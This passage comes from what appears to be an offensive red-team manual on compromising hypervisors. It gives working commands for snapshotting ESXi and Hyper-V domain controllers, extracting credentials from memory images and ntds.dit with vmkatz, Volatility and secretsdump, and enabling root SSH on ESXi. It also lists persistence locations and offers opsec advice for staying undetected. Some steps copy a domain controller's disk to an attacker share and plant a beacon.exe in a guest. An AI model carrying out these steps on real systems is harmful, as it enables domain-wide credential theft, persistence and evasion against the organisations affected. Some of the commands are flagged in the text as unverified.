**A much better idea than downloading the whole disk.** If you have host shell access, do the extraction on the host and transfer kilobytes instead of gigabytes. Mount the guest's filesystem read-only from the ESXi shell is not directly possible, but you can copy just the files you need out of a snapshot using a helper VM, or better, run the extraction from a Linux VM on the same host with the target's snapshot disk hot-added read-only. That converts a 60GB transfer into a 20MB one. The same logic applies with `libguestfs` if you can get the image onto any Linux box with enough disk, including one inside the estate.

**Failure modes.**

- HTTP 401 with a credential that works elsewhere: the `/folder` endpoint on vCenter needs the datacenter path to be the inventory path, and a wrong `dcPath` returns an authentication-shaped error rather than a not-found on some builds.
- HTTP 404 on the datastore: `dsName` is case-sensitive and must be the datastore's display name, spaces URL-encoded.
- A 1KB download: you fetched the descriptor rather than the extent. See the common mistake above.
- `The object or item referred to could not be found` on a file you can see in the listing: the VM was migrated to another host and the datastore is not mounted where you are asking. Target the host that currently owns it, or go through vCenter.
- Download stalls or resets partway: `/folder` transfers of very large files are fragile over slow links. Use HTTP range requests to resume, and prefer `govc datastore.download` or a snapshot-plus-clone approach for anything large.
- The image will not mount and `virt-filesystems` reports no filesystems: you have a partial download, a chain with missing deltas, or a disk that is encrypted, either by vSphere VM encryption or by BitLocker in the guest.

#### Snapshots, and extracting credentials from a memory snapshot

**What it is.** A snapshot with the memory option writes the guest's entire RAM to the datastore as a file you can download and parse. That file contains everything the guest was protecting in memory.

**Why it works.** A snapshot preserves the VM's state so it can be reverted to. Preserving state means preserving memory, and the hypervisor has complete access to the guest's memory by definition because it allocates and maps it. The resulting file is a raw physical memory image of the guest, laid out as the guest saw it. On ESXi the memory content is written to a `.vmem` file alongside a `.vmsn` snapshot state file describing the layout; suspending a VM instead produces a `.vmss` with the same relationship. Both are physical memory images from the point of view of a memory forensics tool.

What that gets you, in a Windows guest: LSASS's secrets including NT hashes and, where a legacy provider or a WDigest-style path was in play, plaintexts. Kerberos tickets and session keys currently cached, including the TGT of every logged-on user, which you can convert to a usable `.kirbi`. DPAPI master keys, which decrypt saved browser credentials, credential manager entries, and DPAPI-protected application secrets. LSA secrets, which include service account passwords in recoverable form. Cached domain credentials. On a domain controller, additionally, whatever of the directory is in the ESE cache. None of this requires a process to run in the guest, so LSA protection, Credential Guard's protection of derived credentials, and every EDR hook in the guest are irrelevant to the acquisition, though Credential Guard does genuinely reduce what is recoverable because the secrets it protects live in a separate virtualisation-based-security region rather than in LSASS's address space.

**Preconditions.** `Virtual machine > Snapshot management > Create snapshot` privilege, or host administrative access. The VM powered on, for memory to exist. Free space on the datastore at least equal to the guest's configured RAM, plus room for the delta disk to grow while the snapshot exists. Local disk to receive the download.

**Commands.**

```bash
# With memory. This is the loud, expensive, high-yield option.
govc snapshot.create -vm 'DC01' -memory -quiesce=false 'maintenance'

# Without memory. Near-instant, cheap, and the right default: it freezes the
# base disk so you can read it consistently.
govc snapshot.create -vm 'DC01' 'maintenance'

govc snapshot.tree -vm 'DC01' -f -i -s
govc snapshot.remove -vm 'DC01' 'maintenance'
```

```powershell
New-Snapshot -VM 'DC01' -Name 'maintenance' -Memory -Quiesce:$false
Get-Snapshot -VM 'DC01' | Select-Object Name,Created,SizeGB,Quiesced
Remove-Snapshot -Snapshot (Get-Snapshot -VM 'DC01' -Name 'maintenance') -Confirm:$false
```

```bash
# From the ESXi shell, with the VM's numeric id from getallvms.
vim-cmd vmsvc/getallvms
vim-cmd vmsvc/snapshot.create <vmid> maintenance "" 1 0    # includeMemory=1 quiesced=0
vim-cmd vmsvc/snapshot.get <vmid>
vim-cmd vmsvc/snapshot.removeall <vmid>
```

<!-- VERIFY vim-cmd snapshot.create positional argument order and the meaning of the trailing flags on current builds -->

Then retrieve the memory image and parse it.

```bash
govc datastore.ls -ds=datastore1 -l 'DC01'
govc datastore.download -ds=datastore1 'DC01/DC01-Snapshot1.vmem' ./DC01.vmem
```

```bash
# Direct extraction of credential material from the snapshot, without a full
# forensics workflow. Handles vmsn, vmem, vmdk and several other formats.
vmkatz ./DC01.vmem
vmkatz --format hashcat ./DC01.vmem
vmkatz --kirbi ./DC01.vmem              # export Kerberos tickets

# Or the classic route: convert to a crash dump for a debugger, or parse the
# raw image with a memory forensics framework.
vmss2core -W DC01.vmsn DC01.vmem        # <!-- VERIFY flag for the target Windows version -->
vol -f DC01.vmem windows.info
vol -f DC01.vmem windows.hashdump
vol -f DC01.vmem windows.lsadump
```

`vmss2core` is VMware's own utility and it needs the `.vmsn` and `.vmem` in the same directory with matching base names, because the state file describes the memory layout that the raw file supplies. The same pairing requirement applies to Volatility. Copying only the `.vmem` and wondering why nothing parses is the standard mistake.

**Verify it worked.** `windows.info` returning a plausible kernel build and profile proves the image is intact and correctly paired. A `hashdump` returning the local accounts, or `vmkatz` returning hashes, proves the extraction. If `windows.info` fails, the image is truncated or the state file is missing.

**Detection and opsec.** This is the most consequential opsec decision in the section, so be explicit about the trade.

Snapshot creation produces a task and event record in vCenter naming the VM, the principal, the source IP and the timestamp, and those records persist in the events database for the configured retention, typically months. It also produces an entry in the VM's `vmware.log`. A snapshot appearing on a domain controller that nobody scheduled is one of the most legible indicators of compromise in the whole estate, because it is a rare, deliberate, attributable administrative action against the most sensitive machine in the environment. If there is ever a retrospective investigation, this is found.

The resource impact is separate and immediate. Taking a snapshot **stuns** the VM: it is paused while the disk state is committed. Without memory, on healthy storage, that is typically milliseconds and nobody notices. **With memory it is proportional to the amount of RAM being written**, because the whole of it goes to the datastore, so a 64GB domain controller means writing 64GB and a stun measured in seconds to tens of seconds. On a domain controller a multi-second stun is enough to cause authentication timeouts across the estate, and on a busy database server it is enough to trigger a cluster failover.

While a snapshot exists, every write to the VM goes to a delta extent that grows without bound. Left in place on a busy server it will eventually fill the datastore, and **a full thin-provisioned datastore stops every VM on it**, not just yours. That is a genuine multi-server outage caused by forgetting to clean up. Removing the snapshot afterwards commits the delta back into the base disk, which is itself an IO-intensive operation proportional to how much the delta grew.

There is one more failure mode that is severe and specific to domain controllers: **never revert a domain controller snapshot.** Reverting a DC to an earlier state rolls its update sequence numbers backwards, which breaks Active Directory replication in a way that is difficult to repair and can require rebuilding the DC. Taking the snapshot is recoverable, reverting it is not. Modern Windows Server has a virtualisation-safe-restore mechanism that mitigates this in some configurations, but do not rely on it.

**The quieter, cheaper, better-yielding alternative.** Take a snapshot *without* memory, which is near-instantaneous, and read the base disk. On a domain controller that gives you `ntds.dit` and the SYSTEM hive, which is **every credential in the domain including `krbtgt`**, a strictly better result than a memory image, for a fraction of the cost and impact. Reach for a memory snapshot only when you specifically need something that exists only in memory: live Kerberos tickets, DPAPI master keys for a currently logged-on user, an application's decrypted secrets, or plaintext passwords.

**Failure modes.**

- `Insufficient disk space on datastore`: you asked to write the guest's RAM to a datastore that does not have room. Check free space against configured memory before you ask.
- Snapshot task queues and never completes: the VM is quiescing and a VSS writer in the guest is hung, which is the standard failure when `-quiesce` is set. Do not quiesce unless you need application consistency; it invokes VSS in the guest, which is both slower and much more visible, because it writes VSS events to the guest's event log.
- `Cannot snapshot a VM with an independent disk` or with a physical raw device mapping: some disk types are not snapshottable, common on database servers and on anything using shared disks for clustering.
- Snapshot succeeds but no `.vmem` appears: you omitted the memory flag, or the VM was powered off.
- The image parses but `hashdump` returns nothing useful: Credential Guard is enabled in the guest, or the image is from a Server build where the relevant structures are not in the framework's symbol set. Try the disk route instead.

#### Host-level shell access on ESXi

**What it is.** A real interactive shell on the hypervisor, as root, from which every guest's storage and every guest's memory is a local file.

**Why it works.** ESXi ships a shell for support purposes: the ESXi Shell on the console, and SSH, both provided by the same service and both disabled by default. Administrative access to the host's API can enable them, because enabling a service is an ordinary configuration operation and the administrator role includes it. Once you have a shell you are root, because ESXi has no meaningful privilege separation for the support shell.

The shell is a BusyBox-derived environment with a small but sufficient toolset. What matters is not the shell itself but what is mounted under it: `/vmfs/volumes/` contains every datastore the host can see, and therefore every disk file of every VM on the host, plus every snapshot and every memory image, as ordinary files.

**Preconditions.** Administrative access to the host, whether via `root`, `vpxuser`, a recovered local account, or a domain group on a joined host. Reachability to 22, or the ability to use the API to enable and reach it. Lockdown mode not in strict mode, or an exception user, or a path through vCenter.

**Commands.** Enable the service, if it is not already running.

```bash
# Through the API. Service identifiers are TSM for the ESXi Shell and
# TSM-SSH for SSH.
govc host.service.ls -host $TARGET
govc host.service -host $TARGET enable TSM-SSH
govc host.service -host $TARGET start  TSM-SSH
```

<!-- VERIFY govc host.service subcommand form and argument order -->

```powershell
Get-VMHostService -VMHost $TARGET | Where-Object { $_.Key -eq 'TSM-SSH' } | Start-VMHostService
```

```bash
# From the local console or an existing shell.
vim-cmd hostsvc/enable_ssh
vim-cmd hostsvc/start_ssh
```

Once in, orient yourself and enumerate.

```bash
esxcli system version get
esxcli system hostname get
esxcli network ip interface ipv4 address list
esxcli network ip route ipv4 list
esxcli storage filesystem list           # datastores, their UUIDs, free space
esxcli system account list               # local accounts
esxcli system permission list            # who holds what on this host
esxcli system settings advanced list -o /UserVars/SuppressShellWarning
esxcli vm process list                   # running VMs with world IDs

vim-cmd vmsvc/getallvms
vim-cmd hostsvc/net/info
ls -la /vmfs/volumes/
```

The interesting files:

| Path | Contents |
| --- | --- |
| `/etc/shadow` | Local account password hashes, including `root`. SHA-512 crypt. Crackable, and frequently reused across every host in the estate |
| `/etc/vmware/hostd/authorization.xml` | Local permission assignments, which principal holds which role |
| `/etc/vmware/esx.conf` | Host configuration including networking and storage |
| `/vmfs/volumes/<ds>/<vm>/` | Every guest's `.vmx`, `.vmdk`, `.vmsn`, `.vmem`, `.nvram` and `vmware.log` |
| `/var/log/` and `/scratch/log/` | Host logs. Often a symlink to scratch, and on stateless or ramdisk-scratch hosts these are lost on reboot |
| `/etc/rc.local.d/local.sh` | Runs at boot. The standard ESXi persistence location, and the one ransomware crews use |
| `/etc/ssh/keys-root/authorized_keys` | Root's SSH authorised keys, the other standard persistence location |

**The root password hash is worth extracting immediately even if you already have root**, because ESXi root passwords are set at build time from the same runbook across the whole estate, and a crack gives you every host including the ones vCenter does not know about, plus a credential that survives your access being revoked.

Persistence on ESXi has a wrinkle worth knowing: `/etc` is on a ramdisk, and changes are persisted into the boot bank only when the configuration is backed up, which happens on a timer and at clean shutdown. A change you make and do not persist is lost on reboot. Force it:

```bash
/sbin/auto-backup.sh
```

**Verify it worked.** `id` returns root, `esxcli system version get` returns the build, and `ls /vmfs/volumes/` lists datastores by name and UUID. If `/vmfs/volumes/` is empty you are on a host with no mounted datastores, which happens on a host that has lost storage connectivity and is a different problem.

**Detection and opsec.** Several distinct artefacts, and one of them is glaringly visible.

Enabling SSH or the ESXi Shell raises a **persistent configuration issue banner on the host's summary page in vCenter**, which stays there for as long as the service is running, and which the platform team sees every time they look at the host. It also generates a host configuration change event. This is not subtle. Many estates deliberately suppress the warning with `UserVars.SuppressShellWarning`, in which case you are lucky, and you should check that setting before deciding how visible you will be.

Every command typed in the ESXi Shell is logged to `/var/log/shell.log` with a timestamp and the user. SSH authentication lands in `/var/log/auth.log`. API-driven service changes land in `hostd.log` and in vCenter's event database. If syslog forwarding is configured, which you can check with `esxcli system syslog config get`, all of that has already left the host and cannot be edited.

The cleanest tradecraft is therefore: check whether SSH is already enabled before enabling it, because on a great many estates it already is and then you generate no configuration change at all; check whether syslog forwarding is configured before assuming local logs matter; and disable the service again when you are done if you enabled it.

**Failure modes.** Lockdown mode in strict mode refuses SSH and the shell even for `root`, and the only route in is the API or the physical console. In normal lockdown mode, only exception users can log in directly. SSH enabled but refusing your password usually means the account is not permitted shell access, which is a per-account setting distinct from having the administrator role. A shell that connects and immediately disconnects is the ESXi Shell timeout setting, `UserVars.ESXiShellTimeOut`, having expired the service. `Permission denied` writing to `/etc` means the ramdisk is full, which happens on hosts with logging misconfigured.

#### The endgame: the domain controller's disk or memory

**What it is.** The reason all of the above matters. Hypervisor access converts into complete, permanent domain compromise by reading one virtual machine's storage.

**Why it works.** A domain controller's entire security value is in a single Extensible Storage Engine database, `ntds.dit`, holding every principal's credential material, encrypted with keys derived from the machine's boot key which lives in the SYSTEM registry hive on the same disk. Both files are on the disk you can read. `lsass.exe` holds an exclusive lock on the database while the DC is running, which is why in-guest extraction needs a shadow copy or a service-level trick and generates telemetry. Reading the disk from outside the guest has no lock to contend with and no telemetry to generate, because there is no process in the guest involved.

**Preconditions.** Datastore read access, and either a snapshot to make the base disk consistent or a powered-off copy such as a template, a clone, an old backup, or a decommissioned DC nobody deleted.

**Commands.** The full path, end to end.

```bash
# 1. Identify the domain controllers. The guest hostname and the VM name
#    usually match, and the guest OS string confirms it.
govc vm.info -json '*' | jq -r '.virtualMachines[] | select(.guest.hostName != null) | [.name, .guest.hostName, .guest.guestFullName] | @tsv' | grep -i dc

# 2. Freeze the base disk. No memory, so this is fast and cheap.
govc snapshot.create -vm 'DC01' 'patch-baseline'

# 3. Read the descriptor to learn the extent names, then fetch the base extent.
govc datastore.ls -ds=datastore1 -l 'DC01'
govc datastore.download -ds=datastore1 'DC01/DC01-flat.vmdk' ./DC01-flat.vmdk

# 4. Clean up so the delta does not grow forever.
govc snapshot.remove -vm 'DC01' 'patch-baseline'
```

Then extract on your own machine. `libguestfs` handles the disk container and the partition table without needing loop devices or root, and is the least error-prone option.

```bash
# Enumerate filesystems, find the Windows volume.
virt-filesystems -a DC01-flat.vmdk --long -h --all

# Pull the whole NTDS directory and the SYSTEM hive. Take the log files too.
virt-copy-out -a DC01-flat.vmdk /Windows/NTDS ./
virt-copy-out -a DC01-flat.vmdk /Windows/System32/config/SYSTEM ./
virt-copy-out -a DC01-flat.vmdk /Windows/System32/config/SECURITY ./
```

```bash
# Alternative with qemu-nbd when you want a block device, for example to
# work with tools that need one. Read-only, always.
sudo modprobe nbd max_part=16
sudo qemu-nbd --read-only --connect=/dev/nbd0 -f vmdk DC01-flat.vmdk
lsblk /dev/nbd0
sudo mount -o ro,show_sys_files /dev/nbd0p3 /mnt/dc
# ...
sudo umount /mnt/dc && sudo qemu-nbd --disconnect /dev/nbd0
```

```bash
# Extract every credential in the domain.
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile domain
```

**Common mistake, and the one that wastes the most time.** A crash-consistent image of a running DC has a **dirty** ESE database, because the transaction log holds committed changes not yet written into the `.dit`. `secretsdump` will refuse it with a database-state error. The fix is to bring the database to a clean shutdown state using the log files, which is why you copy the whole `Windows/NTDS` directory rather than just the `.dit`: you need `edb.log`, the `edbNNNNN.log` generations, and `edb.chk`.

```bash
# Recover the database using its own logs. Run on Windows, or under Wine, with
# esentutl from a matching or newer Windows build. /i ignores mismatched
# database signatures which is normally what you want here.
esentutl /r edb /l . /s . /i
# If recovery is not possible, repair, accepting possible data loss. Last resort.
esentutl /p ntds.dit
```

<!-- VERIFY esentutl recovery flag combination for a copied NTDS directory -->

The clean alternative, if you have snapshot rights, is to take the snapshot **with quiescing enabled** so VSS in the guest flushes the database to a consistent state before the snapshot point. That gives you a clean `.dit` and saves the recovery step, at the cost of VSS events in the guest's application log and a longer, more visible operation. Judge which cost you prefer.

**What you do with it.** `secretsdump` against the NTDS database yields, in one output: the NT hash of every user and computer account in the domain, historical hashes where password history is stored, the Kerberos keys including AES256 for every principal, and the `krbtgt` account's keys. From there, cross-reference the Kerberos Abuse section: `krbtgt` gives you golden tickets and therefore arbitrary authentication as any principal in the domain, indefinitely, without touching a domain controller again. The computer account hashes give you silver tickets and machine-account authentication. The user hashes give you pass-the-hash and offline cracking material for password reuse into other systems, cloud tenants and third parties. If the domain is one of several in a forest, the trust keys are in there too, and the Enterprise Admin path follows.

Two related targets on the same disk are worth taking while you are there. The `SECURITY` hive yields LSA secrets, including cached service account passwords in recoverable form and the DPAPI machine key. And on any DC that is also, or was also, a certificate authority, the CA's private key is on that disk, which cross-references the Coercion, Relay and Certificate Abuse section: the CA key lets you forge certificates for any principal, which is a parallel and equally durable path.

**Verify it worked.** `secretsdump` completing and emitting a `.ntds` file with a plausible number of accounts. Validate one recovered hash by authenticating with it, for example `nxc smb $DC -u '$USER' -H '$NTHASH'` returning `Pwn3d!` or a successful session. Validating on a low-value member server rather than a DC keeps the confirmation quiet.

**Detection and opsec.** The acquisition side is covered above: a snapshot event and a datastore read, both in the hypervisor's logs, neither in the Windows estate's logs. The extraction happens entirely on your hardware and generates nothing anywhere. The **use** of the recovered material is where detection returns, and it is covered in the Kerberos Abuse and Lateral Movement sections; a golden ticket is quiet on the wire but has specific detectable properties.

The point worth internalising: this whole path produces **no Windows security event log entries at all** on the domain controller, no 4624, no 4662, no DCSync 4662 with the replication GUIDs, no LSASS access, no suspicious process. Every detection engineering effort aimed at credential theft on domain controllers is aimed at a different attack. The trade is that it produces an unmistakable record in a system whose logs are usually reviewed only after an incident, and that the impact of the specific actions, snapshotting a DC, is severe enough that it should be a conscious decision.

**Failure modes.** BitLocker enabled on the DC's system volume, in which case the disk is opaque and you need the recovery key, which is stored in AD, which is on the disk you cannot read. Break that circularity via a memory snapshot instead, since the volume master key is in memory on a running machine, or via the recovery key held in the guest's own AD object read from a different DC, or via an escrowed key in a management tool. vSphere-level VM encryption, which is rare but has the same effect and whose keys live in the configured key provider. A missing `-flat` extent because the disk is thin and uses sparse extents, so read the descriptor. `secretsdump` failing on a dirty database, handled above. A domain controller that is physical, in which case none of this applies to it and you should check whether every DC in the domain is physical or only that one, because you only need one virtual DC.

### Hyper-V

**What it is.** Microsoft's hypervisor, and the platform you meet in estates that standardised on Microsoft licensing. Attacking it is different from attacking vSphere in one decisive way: a Hyper-V host is a Windows Server, so it is inside the identity system it hosts rather than beside it.

#### Why Active Directory integration changes the attack

vSphere's management plane is a separate appliance with its own identity store that optionally federates to AD. Hyper-V's management plane is Windows, domain-joined, with no separate identity store at all. Every consequence of that is in your favour.

The host has a **computer account in the domain**, so it appears in your AD enumeration, it appears in BloodHound CE, and every ACL-based path that works against a Windows server works against it. Local administrator rights on it are grantable through domain groups, Group Policy, restricted groups, and any of the other mechanisms enumerated in the Active Directory: Enumeration section and abused in the Coercion, Relay and Certificate Abuse section. There is no separate "hypervisor administrator" concept to enumerate: you enumerate local admin on a Windows box, and if you have it, you own the hypervisor.

Because the host is domain-joined, **the entire Windows post-exploitation toolkit applies unchanged**. LSASS is on it, and it holds the credentials of every admin who has logged in, which for a Hyper-V host means the virtualisation team. DPAPI applies. Scheduled tasks, services, WMI event subscriptions and the rest of the persistence surface applies. Kerberos delegation applies. Everything in the Windows Post-Exploitation section is directly usable, and you should treat a Hyper-V host as a high-value Windows server first and as a hypervisor second.

The circularity is more literal than on vSphere. The host authenticates to a domain controller that is running on it. If you compromise the host you read the DC's disk; if you compromise the DC you have local administrator on the host by policy. There is no ordering that resolves it.

Two management layers sit above individual hosts and are worth hunting specifically. **Failover Clustering** groups hosts sharing storage, and cluster membership means every node can see every VM's disks on the cluster shared volume. **System Center Virtual Machine Manager**, SCVMM, is the vCenter analogue: a central management server with a SQL Server backend, a run-as account store holding credentials for the fabric, and an administrator role that owns every host it manages. SCVMM is a much better target than any single host, and because its backend is SQL Server, the MSSQL material in the Enterprise Services section applies to it. The run-as accounts are the prize: they are stored credentials with rights across the fabric and into the guests.

#### The Hyper-V Administrators group

**What it is.** A built-in local group, SID `S-1-5-32-578`, granting unrestricted access to all Hyper-V features on the host. Microsoft's own documentation is explicit that it is not intended as a security boundary, in the same way that local administrator to kernel is not a security boundary.

**Why it works.** The group exists so that virtualisation operators can manage VMs without being full local administrators on the host. The trouble is that "all Hyper-V features" includes creating a virtual machine with a disk file at a path you choose, attaching physical disks to a VM as passthrough devices, exporting a VM's state, and interacting with the Virtual Machine Management Service, which runs as SYSTEM. Each of those is a primitive that converts to SYSTEM or to arbitrary data access with a small amount of work.

The most direct routes:

- **Read any guest's disk.** You do not need SYSTEM for this at all. Membership grants access to the VHD and VHDX files of the VMs on the host, and to their checkpoints. Mount them and you are done. On a host running a domain controller this is the whole engagement.
- **Attach a physical disk to a VM you control.** Hyper-V supports passthrough of a physical disk to a guest. A VM whose disk is the host's own volume, booted into an OS you control, reads the host's filesystem.
- **File system redirection against the VMMS.** The service creates and manipulates files as SYSTEM at paths influenced by the VM configuration, and the ACLs it applies at VM creation grant the creator full control over the resulting disk file. Published work has demonstrated arbitrary file overwrite as SYSTEM by combining that with hard links or junctions during VM creation and deletion. Treat this as a live escalation class rather than a single patched bug; Microsoft's position that the group is not a boundary means these are not always treated as security fixes.

**Preconditions.** Membership of `Hyper-V Administrators` on the host, directly or through a domain group. Note that this group is a common target of a delegated-administration model, so it is frequently populated with a domain group containing a dozen people.

**Commands.** Enumerate membership, from the domain side and locally.

```powershell
# Locally on the host.
Get-LocalGroupMember -Group 'Hyper-V Administrators'

# Across the estate, find the hosts and who administers them. Hyper-V hosts
# advertise themselves through their service principal names.
Get-ADComputer -LDAPFilter '(servicePrincipalName=Microsoft Virtual System Migration Service/*)' -Properties dNSHostName,operatingSystem
Get-ADComputer -LDAPFilter '(servicePrincipalName=Hyper-V Replica Service/*)' -Properties dNSHostName
```

```bash
# The same from Linux. The SPN is the reliable discriminator: a Hyper-V host
# registers a virtual system migration SPN, an ordinary member server does not.
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" -b "DC=corp,DC=local" \
  "(servicePrincipalName=Microsoft Virtual System Migration Service/*)" \
  dNSHostName operatingSystem servicePrincipalName msDS-AllowedToDelegateTo
```

Then enumerate the platform itself.

```powershell
Get-VMHost | Select-Object Name,LogicalProcessorCount,MemoryCapacity,VirtualMachinePath,VirtualHardDiskPath
Get-VM | Select-Object Name,State,Generation,Version,Path,AutomaticStartAction
Get-VM | Get-VMHardDiskDrive | Select-Object VMName,ControllerType,Path
Get-VM | Get-VMNetworkAdapter | Select-Object VMName,SwitchName,IPAddresses,MacAddress
Get-VMSnapshot -VMName * | Select-Object VMName,Name,CreationTime,SnapshotType
Get-VMReplication
Get-ClusterSharedVolume        # if the host is clustered
```

`Get-VMHardDiskDrive` giving you paths is the important one, because those paths are where the data is and they tell you immediately whether the storage is local, on a cluster shared volume, or on an SMB share.

**Verify it worked.** `Get-VM` returning the inventory confirms Hyper-V management access. `Get-Content` or `Get-VHD` against a guest's VHDX path succeeding confirms you can reach the storage, which is the thing that actually matters.

**Detection and opsec.** Hyper-V operations are logged to the `Microsoft-Windows-Hyper-V-VMMS` operational and admin channels, and VM lifecycle operations are recorded there with the initiating user. Because the host is a Windows box, an EDR agent may well be installed on it, unlike ESXi, and PowerShell operations are subject to script block logging and module logging if configured. **This is the key opsec difference from vSphere: on Hyper-V you are operating inside the monitored Windows estate, not outside it.** Assume your commands are logged and possibly alerted on, and behave as you would on any other high-value Windows server.

**Failure modes.** `Get-VM` returning an access denied means you are neither a local administrator nor in `Hyper-V Administrators`. The Hyper-V PowerShell module not being present means you are on a Server Core install without the management tools, or on a host where it was never installed; the WMI namespace `root\virtualization\v2` is always there and is the underlying interface. Cluster cmdlets failing means the host is standalone.

#### Checkpoints, VHD access and guest state files

**What it is.** The Hyper-V equivalents of snapshots and virtual disks, and the files that hold guest disk and memory content.

**Why it works.** Same mechanism as everywhere else: guest storage is a file, guest memory when saved is a file, and the hypervisor has full access to both. The file types you will meet:

| Extension | Contents |
| --- | --- |
| `.vhd` / `.vhdx` | Virtual hard disk. `.vhdx` is the modern format. This is the guest's disk |
| `.avhdx` | A differencing disk created by a checkpoint. Writes go here while the parent is frozen. Same role as a VMware delta extent |
| `.vmcx` | VM configuration, binary format in current versions |
| `.vmrs` | Runtime state, including saved guest memory. This is the memory image |
| `.vmgs` | Guest state file for Generation 2 VMs, holding firmware and vTPM state |
| `.bin` / `.vsv` | Saved memory and device state on older Hyper-V versions |

A **checkpoint** freezes the parent VHDX and redirects writes to an AVHDX, which means, exactly as with VMware snapshots, that **taking a checkpoint gives you a consistent, unlocked parent disk to read.** Standard checkpoints, the default in current versions on Windows guests, also invoke VSS in the guest for application consistency, and additionally capture memory state. Production checkpoints are the application-consistent variant intended for use on live workloads. Which one is the default matters because a checkpoint that includes memory hands you the guest's RAM.

**Saving** a VM writes its memory to the `.vmrs` and stops it, which is Hyper-V's suspend. That is the cheapest way to get a full memory image if you can tolerate the VM stopping, which on a production DC you cannot.

**Preconditions.** Local administrator or `Hyper-V Administrators` on the host, or read access to the storage location by another route.

**Commands.**

```powershell
# Checkpoint, then read the frozen parent.
Get-VM 'DC01' | Get-VMHardDiskDrive
Checkpoint-VM -Name 'DC01' -SnapshotName 'baseline'
Get-VMSnapshot -VMName 'DC01' | Select-Object Name,SnapshotType,CreationTime,ParentSnapshotName

# Inspect a disk without mounting it: chain, size, type.
Get-VHD -Path 'D:\VMs\DC01\Virtual Hard Disks\DC01.vhdx'

# Mount read-only on the host and read the guest's filesystem directly.
Mount-VHD -Path 'D:\VMs\DC01\Virtual Hard Disks\DC01.vhdx' -ReadOnly -NoDriveLetter -Passthru | Get-Disk
# ...assign a drive letter, read what you need, then:
Dismount-VHD -Path 'D:\VMs\DC01\Virtual Hard Disks\DC01.vhdx'

Remove-VMSnapshot -VMName 'DC01' -Name 'baseline'
```

Mounting the VHDX on the host is the fastest path and it needs no export and no transfer: `Mount-VHD -ReadOnly` surfaces the guest's volumes as local volumes on the host, and you copy `Windows\NTDS\` and the SYSTEM hive out of them. This is the Hyper-V equivalent of the datastore download and it is considerably more convenient, because there is nothing to download.

**Common mistake.** Mounting a VHDX that has checkpoints, by pointing at the base `.vhdx`, gives you the state as of the oldest checkpoint, not the current state. The current state is the tip of the AVHDX chain. `Get-VHD` shows the parent path of each link; mount the tip if you want current data, mount the base if you specifically want a consistent pre-checkpoint image.

Exporting is the alternative when you want the whole VM off the host:

```powershell
Export-VM -Name 'DC01' -Path '\\$ATTACKER\share\'
# Or just the disks, which is all you need.
Copy-Item 'D:\VMs\DC01\Virtual Hard Disks\DC01.vhdx' '\\$ATTACKER\share\'
```

Memory, via a save:

```powershell
Save-VM -Name 'DC01'          # writes memory to .vmrs and stops the VM. Disruptive.
Start-VM -Name 'DC01'
```

Then parse the resulting state file the same way as a VMware memory image. `vmkatz` accepts `.vmrs` directly, as well as `.vhdx` and `.vhd`, so the extraction workflow is identical to the VMware one.

```bash
vmkatz --ntds DC01.vhdx
vmkatz DC01.vmrs
```

**PowerShell Direct** is Hyper-V's guest operations equivalent and deserves explicit mention because it is exactly the same primitive with the same properties: command execution into a guest over the VMBus, with no network involvement at all.

```powershell
# Requires local admin on the host, a Windows 10 or Server 2016 or later guest,
# the guest powered on, and credentials valid inside the guest.
Enter-PSSession -VMName 'DC01' -Credential (Get-Credential)
Invoke-Command -VMName 'DC01' -Credential $cred -ScriptBlock { whoami; hostname }

# File copy into a guest needs the Guest Service Interface integration
# component enabled, which it is not by default.
Enable-VMIntegrationService -VMName 'DC01' -Name 'Guest Service Interface'
Copy-VMFile -Name 'DC01' -SourcePath .\beacon.exe -DestinationPath 'C:\Windows\Temp\beacon.exe' -CreateFullPath -FileSource Host
```
